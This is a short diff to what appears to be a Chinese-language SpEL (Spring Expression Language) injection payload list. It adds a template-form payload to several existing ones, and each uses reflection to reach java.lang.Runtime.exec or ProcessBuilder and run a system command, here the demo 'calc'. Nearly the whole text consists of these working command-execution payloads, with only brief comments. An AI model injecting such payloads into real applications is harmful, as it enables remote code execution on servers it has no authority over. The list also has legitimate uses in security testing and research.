@@ -131,6 +131,7 @@ new ProcessBuilder({'calc'}).start()
 
 // 反射调用
 T(String).getClass().forName("java.lang.Runtime").getRuntime().exec("calc")
+#{T(java.lang.String).forName('java.lang.Runtime').getRuntime().exec('calc')}
 
 // 同上，需要有上下文环境
 #this.getClass().forName("java.lang.Runtime").getRuntime().exec("calc")
